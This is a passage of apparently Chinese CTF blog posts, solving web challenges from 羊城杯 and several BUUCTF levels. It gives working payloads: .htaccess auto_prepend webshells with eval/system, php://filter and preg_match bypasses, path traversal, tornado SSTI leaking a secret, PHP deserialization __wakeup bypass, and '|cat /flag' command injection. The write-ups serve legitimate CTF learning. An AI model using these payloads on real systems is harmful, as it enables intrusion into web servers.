?&gt;</code></pre><p>蚁剑连接，找到flag即可。</p><h3 id="第二种解题方法：利用-htaccess设置文件自动包含"><a href="#第二种解题方法：利用-htaccess设置文件自动包含" class="headerlink" title="第二种解题方法：利用.htaccess设置文件自动包含"></a>第二种解题方法：利用<code>.htaccess</code>设置文件自动包含</h3><h4 id="htaccess设置php环境变量的格式"><a href="#htaccess设置php环境变量的格式" class="headerlink" title=".htaccess设置php环境变量的格式"></a><code>.htaccess</code>设置php环境变量的格式</h4><p><code>.htaccess</code>也可以设置开头自动包含，<code>.htaccess</code>设置php环境变量的格式：</p><pre><code class="bash">#formatphp_value setting_name setting_value#examplephp_value auto_prepend_file .htaccess</code></pre><h4 id="auto-prepend-file与auto-append-file"><a href="#auto-prepend-file与auto-append-file" class="headerlink" title="auto_prepend_file与auto_append_file"></a>auto_prepend_file与auto_append_file</h4><p>使用auto_prepend_file与auto_append_file在所有页面的顶部与底部require文件。<br><code>php.ini</code>中有两项</p><pre><code class="bash">auto_prepend_file #在页面顶部加载文件auto_append_file  #在页面底部加载文件</code></pre><p>使用这种方法可以不需要改动任何页面，当需要修改顶部或底部require文件时，只需要修改auto_prepend_file与auto_append_file的值即可。</p><h4 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h4><h5 id="1、绕过-n的过滤"><a href="#1、绕过-n的过滤" class="headerlink" title="1、绕过\n的过滤"></a>1、绕过<code>\n</code>的过滤</h5><p>于是确定我们要写入的文件<code>.htaccess</code>，文件内容为：</p><pre><code class="bash">php_value auto_prepend_file .htaccess#&lt;?php phpinfo();?&gt;\</code></pre><blockquote><p>末尾有个符号<code>\</code>是必须写入的，我们注意到源代码中file_put_contents中的文件内容传入的变量<code>$content</code>末尾还连接上了<code>\nHello, world</code>这个字符串，而<code>\n</code>代表着换行，而我们再一个<code>\</code>，则会拼接成<code>\\n</code>，即转义掉了n前面的<code>\</code>，构不成换行。换句话来说，如果我们没有加入<code>\</code>，那么写入<code>.htaccess</code>的文件内容就为：</p></blockquote><pre><code class="bash">php_value auto_prepend_file .htaccess#&lt;?php phpinfo();?&gt;Hello, world</code></pre><blockquote><p>会出现末尾行的字符串不符合htaccess文件的语法标准而报错导致htaccess文件无法执行，那么当前目录下的所有文件就会面临崩溃，所以说，末尾必须写入<code>\</code></p></blockquote><h5 id="2、绕过stristr的过滤"><a href="#2、绕过stristr的过滤" class="headerlink" title="2、绕过stristr的过滤"></a>2、绕过stristr的过滤</h5><p>上边写入文件<code>.htaccess</code>的内容里包含了<code>file关键字</code>，被<code>stristr</code>过滤，所以要绕过<code>stristr</code>的过滤</p><pre><code class="php">if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {        echo &quot;Hacker&quot;;        die();    }</code></pre><h6 id="1-方法一：使用base64加密绕过stristr函数"><a href="#1-方法一：使用base64加密绕过stristr函数" class="headerlink" title="1.方法一：使用base64加密绕过stristr函数"></a>1.方法一：使用base64加密绕过stristr函数</h6><p>p神的一篇文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a><br>提到file_put_contents函数中的第一个参数<code>$filename</code>，即写入的文件名是可以控制协议的，所以我们可以用<code>php://filter流</code>的<code>base64-decode</code>方法将文件内容参数<code>$content</code>进行base64解码，那么这样就可以通过将内容进行base64加密来绕过stristr函数的检查。<br><strong>测试代码：</strong></p><pre><code class="php">&lt;?php     $filename = $_GET[&#39;filename&#39;];    $content = $_GET[&#39;content&#39;];    if(stristr($content,&#39;&lt;?php&#39;)){        echo &#39;Hacker&#39;;        die();    }     file_put_contents($filename, $content);?&gt;</code></pre><p>对要写入的content进行base64编码：</p><pre><code class="py">&gt;&gt;&gt; base64.b64encode(&#39;&lt;?php phpinfo(); ?&gt;&#39;)&#39;PD9waHAgcGhwaW5mbygpOyA/Pg==&#39;</code></pre><p>测试payload</p><pre><code class="php">?filename=php://filter/write=convert.base64-decode/resource=phpinfo.php&amp;content=PD9waHAgcGhwaW5mbygpOyA/Pg==</code></pre><p>访问<code>phpinfo.php</code>，成功显示phpinfo信息。<br><strong>绕过preg_match</strong></p><pre><code class="php">if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {        echo &quot;Hacker&quot;;        die();    }</code></pre><p>因为正则判断写的是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code>而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0)</code> ，因此存在了被绕过的可能。</p><p>文件名写入<code>php://filter</code>需要绕过preg_match函数的检查。第一印象想到preg_match处理数组是会返回NULL，然而这里<code>file_put_contents</code>函数传入的文件名参数不支持数组的形式。<br>看xnuca2019-ezphp的wp发现一篇文章：<a href="https://mochazz.github.io/2019/01/13/preg_match%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">preg_match函数绕过</a><br>思路是：通过正则匹配的递归次数来绕过，正则匹配的递归次数由<code>pcre.backtrack_limit</code>参数来控制<br>PHP5.3.7 版本之前默认值为 10万 ，PHP5.3.7 版本之后默认值为 100万。该值可以通过<code>php.ini</code>设置，也可以通过 <code>phpinfo</code>页面查看。<br><img src="http://img-blog.csdnimg.cn/20200913114426905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>要让preg_match返回false，也就是匹配不到，即可绕过preg_match。这里就有一个骚操作，就是通过设置<code>pcre.backtrack_limit</code>值为0，使得回溯次数为0，来使得正则匹配什么都不匹配，即返回false。<br>测试一下，是否能绕过preg_match：</p><pre><code class="php">&lt;?phpini_set(&#39;pcre.backtrack_limit&#39;,0);var_dump(preg_match(&#39;/[^a-z\.]/&#39;,&#39;php://filter&#39;));?&gt;//bool(false) </code></pre><p>成功绕过preg_match。<br><code>pcre.backtrack_limit</code>设置的是php的环境变量，也可以在<code>.htaccess</code>里设置，最终写入到<code>.htaccess</code>中内容如下：</p><pre><code class="bash">php_value pcre.backtrack_limit 0php_value pcre.jit 0php_value auto_prepend_file .htaccess#a&lt;?php eval($_GET[1]); ?&gt;\Hello, world</code></pre><p>因为php版本&gt;=7，所以需要特别设置<code>pcre.jit</code>这个环境变量为0，不适用JIT引擎来匹配正则表达式，就使得<code>pcre.backtrack_limit</code>这个环境变量能正常生效，绕过preg_match函数。<br>最终payload：</p><pre><code class="bash">?filename=php://filter/write=convert.base64-decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fcHJlcGVuZF9maWxlIC5odGFjY2VzcwojYTw/cGhwIGV2YWwoJF9HRVRbMV0pOyA/Plw=&amp;1=phpinfo();</code></pre><p>网上都有这种方法做题，然而经过测试，并没有成功，在buu上复现xnuca2019-ezphp也没有成功。可能是环境问题。(暂时不知道是什么问题，等发现是什么问题后，再继续总结)</p><h6 id="2-方法二：对过滤的关键字中间添加换行-n绕过stristr函数"><a href="#2-方法二：对过滤的关键字中间添加换行-n绕过stristr函数" class="headerlink" title="2.方法二：对过滤的关键字中间添加换行\n绕过stristr函数"></a>2.方法二：对过滤的关键字中间添加换行<code>\n</code>绕过stristr函数</h6><p>可以通过对过滤的关键字中间添加换行<code>\n</code>来绕过stristr函数的检测，不过仍然需要注意添加<code>\</code>来转义掉换行，这样才不会出现语法错误，如此一来就不需要再绕过preg_match函数，即可直接写入<code>.htaccess</code>来getshell<br>payload如下：</p><pre><code class="php">?content=php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;?php%20system(&#39;cat%20/fla&#39;.&#39;g&#39;);?&gt;\&amp;filename=.htaccess</code></pre><p>写入<code>.htaccess</code>的内容：</p><pre><code class="bash">php_value auto_prepend_fil\ e .htaccess #&lt;?php system(&#39;cat /fla&#39;.&#39;g&#39;);?&gt;\ Just one chance</code></pre><p>然后访问index.php即可得到flag：<br><img src="http://img-blog.csdnimg.cn/2020091320395262.png" alt="在这里插入图片描述"><br>参考：<br><a href="https://nikoeurus.github.io/2019/12/01/xnuca-Web/#ezphp" target="_blank" rel="noopener">从xnuca2019-ezphp深入学习.htaccess</a><br><a href="https://www.bdwms.com/?p=525" target="_blank" rel="noopener">2019XNUCA部分Web复盘</a></p><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>基本总结完毕，比赛收获了很多知识。更深一步的了解到了<code>.htaccess</code>解析。继续努力！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 羊城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF百题刷题总结(一)</title>
      <link href="/2020/09/07/BUUCTF%E7%99%BE%E9%A2%98%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93(%E4%B8%80)/"/>
      <url>/2020/09/07/BUUCTF%E7%99%BE%E9%A2%98%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近打算开始刷BUU的Web题了，之前已经刷过一些，有的总结了，有的没有总结。总结过的这里只写之前总结的链接；没总结的，原因是当时感觉有点简单，这里简单写下考察知识点和解题思路。<br>新刷的Web题，会认真总结。BUUCTF刷题系列持续更新(SQL注入题和文件上传题单独记录)！</p><h3 id="0x01-HCTF-2018-WarmUp"><a href="#0x01-HCTF-2018-WarmUp" class="headerlink" title="0x01 [HCTF 2018]WarmUp"></a>0x01 [HCTF 2018]WarmUp</h3><p><strong>考点：PHP代码审计+绕过自定义函数+文件包含</strong><br>查看源代码，发现<code>source.php</code>，访问发现源码</p><pre><code class="php"> &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {    //白名单列表, 有source.php和hint.php            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];//!isset($page)判断$page是否未设置、!is_string($page)判断$page是否是非字符串，满足其一return false            if (! isset($page) || !is_string($page)) {                echo &quot;you can&#39;t see it&quot;;                return false;            }//in_array($page)判断$page的值是否在白名单列表$whitelist中 如果在，则为真return true            if (in_array($page, $whitelist)) {                return true;            }//将变量$page从问号之前截取字符串(如果$page的值有?则从?之前提取字符串)并赋值给$_page            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );//第二次in_array($_page)判断$_page的值是否在白名单列表$whitelist中 如果在，则为真return true            if (in_array($_page, $whitelist)) {                return true;            }            //对$pageurl解码            $_page = urldecode($page);//第二次将变量$_page从问号之前截取字符串并赋值给$_page            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );//第三次in_array($_page)判断$_page的值是否在白名单列表$whitelist中 如果在，则为真return true            if (in_array($_page, $whitelist)) {                return true;            }            echo &quot;you can&#39;t see it&quot;;            return false;        }    }    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) {        include $_REQUEST[&#39;file&#39;];        exit;    } else {        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    }  ?&gt; </code></pre><p>分析一下源码</p><blockquote><p>1.获取POST或GET方法提交的file参数；! empty()判断是否非空、is_string()判断是否是字符串、emmm::checkFile()使用emmm类里的checkFile()函数判断，如果这三个判断全为真，远程包含file参数；否则输入题目的jpg图片<br>2.相关函数：<br>mb_substr() 函数返回字符串的一部分(可分割的中文文字)<br>mb_strpos()查找字符串在另一个字符串中首次出现的位置<br>3.在源码中添加每一步的注释</p></blockquote><p>在<code>hint.php</code>发现<code>flag not here, and flag in ffffllllaaaagggg</code><br>于是根据代码逻辑构造payload：</p><pre><code class="php">先写个在白名单里的参数值如：source.php、hint.php使第一个in_array()返回true，这里我用hint.php然后添加问号?， 截取问号之前的赋值给$_page，即hint.php使第二个in_array()返回true最后多次跳转到上层目录，直到ffffllllaaaagggg文件，然后类里的函数返回真，包含到ffffllllaaaagggg文件。即最终结果如下：?file=hint.php?../../../../../ffffllllaaaagggg</code></pre><h3 id="0x02-极客大挑战-2019-Havefun"><a href="#0x02-极客大挑战-2019-Havefun" class="headerlink" title="0x02 [极客大挑战 2019]Havefun"></a>0x02 [极客大挑战 2019]Havefun</h3><p><strong>考点：代码审计+get传参</strong><br>查看源代码发现泄露了关键源码</p><pre><code class="php">$cat=$_GET[&#39;cat&#39;];echo $cat;if($cat==&#39;dog&#39;){    echo &#39;Syc{cat_cat_cat_cat}&#39;;}</code></pre><p>很明显get传入<code>?cat=dog</code>即可得到flag</p><h3 id="0x03-护网杯-2018-easy-tornado"><a href="#0x03-护网杯-2018-easy-tornado" class="headerlink" title="0x03 [护网杯 2018]easy_tornado"></a>0x03 [护网杯 2018]easy_tornado</h3><p><strong>考点：SSTI+tornado模板+render模板注入+获取cookie_secret</strong><br>题目：easy_tornado<br>tornado是一个用Python语言写成的Web服务器兼Web应用框架。<br>打开页面发现三个链接依次点开<br><img src="http://img-blog.csdnimg.cn/20200803142907219.png" alt="在这里插入图片描述"></p><pre><code class="php">file?filename=/flag.txt&amp;filehash=dd89d1c0810cfa4d496ee2284bf1a3b9flag in /fllllllllllllagfile?filename=/welcome.txt&amp;filehash=6718db2c7a20bfb11fd19222a9f1772frenderfile?filename=/hints.txt&amp;filehash=826794470058d90965404b4139639661md5(cookie_secret+md5(filename))</code></pre><p>从上面三个文件内容可以确定flag在/fllllllllllllag文件<br><a href="https://blog.csdn.net/qq78827534/article/details/80792514" target="_blank" rel="noopener">render函数介绍</a><br>对比这三个文件和url，访问文件需要把<code>cookie_secret</code>加上<code>fliename的md5编码</code>后再进行md5编码，即</p><pre><code class="php">file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(/fllllllllllllag))</code></pre><p>于是，求得<code>filehash</code>的值，即可得到flag。求得<code>filehash</code>前需要得到<code>cookie_secret</code>。经测试，存在模板注入<br><img src="http://img-blog.csdnimg.cn/20200803144736847.png" alt="在这里插入图片描述"><br>查阅资料得知</p><blockquote><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是<code>handler.settings</code><br>handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings<br>所以handler.settings就指向RequestHandler.application.settings了，这里面是一些环境变量</p></blockquote><p>参考：<a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html" target="_blank" rel="noopener">python SSTI tornado render模板注入</a><br>于是传入<code>error?msg={{handler.settings}}</code>得到<code>cookie_secret</code><br><img src="http://img-blog.csdnimg.cn/20200803145529442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>于是将<code>cookie_secret</code>代入<code>md5(cookie_secret+md5(/fllllllllllllag))</code>，并求得filehash的值。<br>可通过<a href="https://md5jiami.51240.com/" target="_blank" rel="noopener">md5加密在线网站</a>，也可通过下面脚本得到：</p><pre><code class="py">import hashlibdef md5(s):    md5 = hashlib.md5()     md5.update(s.encode(&quot;utf8&quot;))     return md5.hexdigest()def filehash():    filename = &#39;/fllllllllllllag&#39;    cookie_secret = &#39;738a090d-07f8-4893-890b-de0eb10093cd&#39;    print(md5(cookie_secret+md5(filename)))if __name__ == &#39;__main__&#39;:    filehash()</code></pre><p>跑脚本得到filehash的值：<code>a7f620001b50f75242ff6d6ac63addc0</code><br>于是最终payload是</p><pre><code class="php">file?filename=/fllllllllllllag&amp;filehash=a7f620001b50f75242ff6d6ac63addc0</code></pre><p><img src="http://img-blog.csdnimg.cn/20200803150221408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="0x04-RoarCTF-2019-Easy-Calc"><a href="#0x04-RoarCTF-2019-Easy-Calc" class="headerlink" title="0x04 [RoarCTF 2019]Easy Calc"></a>0x04 [RoarCTF 2019]Easy Calc</h3><p><strong>考点：HTTP请求走私+PHP字符串解析特性+一些函数</strong><br>一些函数：<code>scandir()函数</code>、<code>readfile()函数</code>、<code>base_convert()函数</code>、<code>dechex() 函数</code>、<code>hex2bin() 函数（chr()函数）</code><br><a href="https://blog.csdn.net/qq_43625917/article/details/102731391" target="_blank" rel="noopener">从一道题到HTTP请求走私</a></p><h3 id="0x05-极客大挑战-2019-Secret-File"><a href="#0x05-极客大挑战-2019-Secret-File" class="headerlink" title="0x05 [极客大挑战 2019]Secret File"></a>0x05 [极客大挑战 2019]Secret File</h3><p><strong>考点：burp重放+文件包含+伪协议</strong><br>先查看源代码，发现<code>./Archive_room.php</code><br>点击SECRET(即访问action.php)时，使用 burp抓包，重放得到<code>secr3t.php</code>，访问得到：</p><pre><code class="php">&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET[&#39;file&#39;];    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){        echo &quot;Oh no!&quot;;        exit();    }    include($file); //flag放在了flag.php里?&gt;</code></pre><p><code>stristr()</code>函数搜索字符串在另一字符串中的第一次出现<br>简单理解下，代码逻辑。很明显不用考虑那么多，直接构造payload：</p><pre><code class="php">?file=flag.php</code></pre><p>发现读取<code>flag.php</code>成功，但没有显示。于是考虑使用php伪协议读取即可</p><pre><code class="php">?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>得到Base64编码的flag，解码即可得到flag</p><h3 id="0x06-ACTF2020-新生赛-Include"><a href="#0x06-ACTF2020-新生赛-Include" class="headerlink" title="0x06 [ACTF2020 新生赛]Include"></a>0x06 [ACTF2020 新生赛]Include</h3><p><strong>考点：文件包含+伪协议</strong><br>点击tips，发现url增加了<code>?file=flag.php</code>，访问结果是<code>Can you find out the flag?</code>。<br>看到<code>?file=flag.php</code>，第一印象可以想到文件包含，因为又没显示flag，所以接下来想到使用伪协议读取<code>flag.php</code>文件，最终payload:</p><pre><code class="php">?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>得到Base64编码的flag，解码即可得到flag</p><pre><code class="php">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NWRkNzM4NDYtOGNkYS00NjU3LWE4MTgtYzY4MzJiNzUzODAwfQo=</code></pre><h3 id="0x07-HCTF-2018-admin"><a href="#0x07-HCTF-2018-admin" class="headerlink" title="0x07 [HCTF 2018]admin"></a>0x07 [HCTF 2018]admin</h3><p><strong>考点：flask session 伪造+unicode欺骗+条件竞争</strong><br>由于暂时还没学 flask框架，暂不总结后续补上。</p><h3 id="0x08-GXYCTF2019-Ping-Ping-Ping"><a href="#0x08-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="0x08 [GXYCTF2019]Ping Ping Ping"></a>0x08 [GXYCTF2019]Ping Ping Ping</h3><p><strong>考点： 命令执行+绕过空格+绕过黑名单(也可内敛执行绕过)</strong><br>之前博客：<a href="https://blog.csdn.net/qq_43625917/article/details/107873778" target="_blank" rel="noopener">命令执行绕过的练习(一)</a></p><h3 id="0x09-极客大挑战-2019-Knife"><a href="#0x09-极客大挑战-2019-Knife" class="headerlink" title="0x09 [极客大挑战 2019]Knife"></a>0x09 [极客大挑战 2019]Knife</h3><p><strong>考点：中国菜刀、蚁剑等 shelll管理工具的使用</strong><br>题目直接给了一句话木马和密码<code>eval($_POST[&quot;Syc&quot;]);</code>。直接使用蚁剑连接即可，flag在<code>/flag</code></p><h3 id="0x10-极客大挑战-2019-PHP"><a href="#0x10-极客大挑战-2019-PHP" class="headerlink" title="0x10 [极客大挑战 2019]PHP"></a>0x10 [极客大挑战 2019]PHP</h3><p><strong>考点：源码泄露+代码审计+PHP反序列化+private声明字段+绕过<code>__wakeup()</code>函数</strong><br>一进题目发现里边写了一句话：</p><blockquote><p>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯<br>不愧是我！！！ </p></blockquote><p>很明显是源码泄露，备份了网站，第一印象想到备份在<code>www.zip</code>。测试之后，果然是，于是下载源码<br><img src="http://img-blog.csdnimg.cn/20200812235547797.png" alt="在这里插入图片描述"><br>源码里发现 <code>flag.php</code>文件，里边的 flag不对。应该只是为了说明flag文件的位置，在网站上想办法读取。<br>于是在<code>index.php</code>和<code>class.php</code>文件里发现源码<br><code>index.php</code></p><pre><code class="php"> &lt;?php    include &#39;class.php&#39;;    $select = $_GET[&#39;select&#39;];    $res=unserialize(@$select); ?&gt;</code></pre><p>审计<code>index.php</code>：</p><blockquote><p>包含class.php文件<br>get传入<code>select参数</code>，然后赋值给<code>$select</code>变量<br>对<code>$select</code>变量进行反序列化后，赋值给<code>$res</code>变量</p></blockquote><p><code>class.php</code></p><pre><code class="php">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><h4 id="1、public、protected与private在序列化时的区别"><a href="#1、public、protected与private在序列化时的区别" class="headerlink" title="1、public、protected与private在序列化时的区别"></a>1、public、protected与private在序列化时的区别</h4><p><strong>1.protected</strong><br>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。<br>（1）序列化时，字段名前面会加上<code>\0*\0</code>的前缀,即<code>0*\0字段名</code>。<code>\0</code>表示ASCII 码为0的字符(不可见字符)，用python传值<br>（2）序列化时，格式是<code>%00*%00字段名</code>，普通传值<br><strong>2.private</strong><br>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。<br>（1）序列化时，类名和字段名前面都会加上<code>\0</code>的前缀，即<code>\0类名\0字段名</code>。字符串长度也包括所加前缀的长度<br>（2）序列化时，格式是<code>%00类名%00字段名</code>，普通传值</p><h4 id="2、-wakeup-方法绕过-CVE-2016-7124"><a href="#2、-wakeup-方法绕过-CVE-2016-7124" class="headerlink" title="2、__wakeup()方法绕过(CVE-2016-7124)"></a>2、__wakeup()方法绕过(CVE-2016-7124)</h4><p><strong>1.作用：</strong> 与<code>__sleep()</code>函数相反，<code>__sleep()函数</code>，是在序序列化时被自动调用。<code>__wakeup()</code>函数，在反序列化时，被自动调用。<br><strong>2.绕过：</strong> 当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过<code>__wakeup()</code>函数的执行。<br>审计<code>class.php</code>：</p><blockquote><p>包含flag.php文件，文件里<code>$flag</code>变量的值是flag<br>定义一个Name类，使用private声明私有成员变量<code>$username</code>和<code>$password</code>并赋初值<br>创建对象，调用构造函数 <strong>construct()，<br>销毁对象，调用析构函数</strong>destruct()<br> __wakeup()在反序列化时，被自动调用。<br> 分析一下，析构函数里的代码逻辑：<br> password=100绕过第一个if条件<br> username=’admin’满足第二个if条件，定义全局变量<code>$flag</code>，输出<code>$flag</code></p></blockquote><p> 所以需要<code>password=100</code>且<code>username=&#39;admin&#39;</code>。<br>由于在反序列化时，会调用<code>__wakeup()</code>函数，使username的值被覆盖成guest。通过设置属性个数的值，使属性个数的值大于真实属性个数进行绕过。<br> 于是构造exp进行序列化：</p><pre><code class="php">&lt;?phpclass Name{    private $username = &#39;admin&#39;;    private $password = 100;}    $class1 = new Name;    $class1_ser = serialize($class1);    print_r($class1_ser);?&gt;</code></pre><p>得到</p><pre><code class="php">O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}</code></pre><p>根据private 声明的字段特点：序列化时格式是<code>%00类名%00字段名</code><br>使属性个数的值大于真实属性个数绕过<code>__wakeup()</code>函数，即将第一个Name后的2改为大于2的数如：3<br>修改得到payload：</p><pre><code class="php">O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></pre><p>get传参，参数是select，参数值是上边的这个。得到flag<br><img src="http://img-blog.csdnimg.cn/20200813012113718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="0x11-ACTF2020-新生赛-Exec"><a href="#0x11-ACTF2020-新生赛-Exec" class="headerlink" title="0x11 [ACTF2020 新生赛]Exec"></a>0x11 [ACTF2020 新生赛]Exec</h3><p><strong>考点：命令执行+ping环境</strong></p><pre><code class="bash">target=|find  / -name flag*#找到flag位置：/flagtarget=|cat /flag#得到flag</code></pre><h3 id="0x12-极客大挑战-2019-Http"><a href="#0x12-极客大挑战-2019-Http" class="headerlink" title="0x12 [极客大挑战 2019]Http"></a>0x12 [极客大挑战 2019]Http</h3><p><strong>考点：HTTP请求头流量包伪造</strong><br>查看源代码发现<code>Secret.php</code>，访问得到<br><code>It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;</code><br><strong>1.伪造Referer</strong>：<br>使用Burp抓包伪造即可(下同)</p><pre><code class="php">Referer: https://www.Sycsecret.com</code></pre><p>得到<code>Please use &quot;Syclover&quot; browser</code><br><strong>2.伪造UA</strong><br>于是伪造浏览器，通过修改UA的最后边浏览器标识进行伪造。<br>得到<code>No!!! you can only read this locally!!!</code>，于是伪造IP<br><strong>3.伪造IP</strong><br>可通过伪造XFF、Client-IP等</p><pre><code class="php">X-Forwarded-For: 127.0.0.1</code></pre><p>发包，最终得到 flag</p><h3 id="0x13-ACTF2020-新生赛-BackupFile"><a href="#0x13-ACTF2020-新生赛-BackupFile" class="headerlink" title="0x13 [ACTF2020 新生赛]BackupFile"></a>0x13 [ACTF2020 新生赛]BackupFile</h3><p><strong>考点：源码泄露+代码审计+PHP弱类型</strong><br>看到题目标题<code>BackupFile</code>，很容易想到存在源码泄露，且源码是<code>.bak</code>结尾的文件。<br>于是尝试访问<code>index.php.bak</code>，发现可以下载源码，内容是：</p><pre><code class="php">&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#39;key&#39;])) {    $key = $_GET[&#39;key&#39;];    if(!is_numeric($key)) {        exit(&quot;Just num!&quot;);    }    $key = intval($key);    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;    if($key == $str) {        echo $flag;    }}else {    echo &quot;Try to find out source file!&quot;;}</code></pre><p>审计一下代码逻辑：</p><blockquote><p>包含flag.php文件<br>1.如果get传参传入了参数key，将参数值赋值给变量<code>$key</code><br>2.如果<code>$key</code>的值是非数字，输出Just num!结束；获取<code>$key</code>的整数值再赋值给<code>$key</code><br>3.如果<code>$key</code> == <code>$str</code>输出flag。使用的是==，在进行比较的时候，会先将字符串类型转化成相同再比较</p></blockquote><p>于是可以构造出payload：</p><pre><code class="php">?key=123#访问得到flag</code></pre><h3 id="0x14-极客大挑战-2019-BuyFlag"><a href="#0x14-极客大挑战-2019-BuyFlag" class="headerlink" title="0x14 [极客大挑战 2019]BuyFlag"></a>0x14 [极客大挑战 2019]BuyFlag</h3><p><strong>考点：PHP弱类型</strong><br>点击MENU，选择PAYFLAG，查看源代码得到：</p><pre><code class="php">~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) {    $password = $_POST[&#39;password&#39;];    if (is_numeric($password)) {        echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;    }elseif ($password == 404) {        echo &quot;Password Right!&lt;/br&gt;&quot;;    }}</code></pre><p>根据代码意思</p><blockquote><p>1.需要post传money和password参数<br>2.根据题目money等于100000000<br>3.password利用is_numeric()函数判断不能是数字，且password等于404很明显考察弱类型绕过is_numeric()函数</p></blockquote><p>绕过is_numeric()函数的方法有：加<code>%00</code>、<code>%20</code>、<code>%0d</code>、<code>%0a</code>、<code>|</code>、<code>;</code>等等<br>于是构造payload</p><pre><code class="php">money=100000000&amp;password=404%00</code></pre><p>测试发现，没反应。根据提示<code>Only Cuit&#39;s students can buy the FLAG</code>，应该需要观察Cookie，发现<code>Cookie: user=0</code>，将0改为1重新发包。<br>得到<br>you are Cuiter<br>Password Right!<br>Nember lenth is too long<br>意思就是Nember的长度太长了，也就是传入的money参数太大了。<br>也发现PHP的版本是PHP/5.3.3，猜测一下可能通过<code>strcmp()</code>函数进行比较，即</p><pre><code 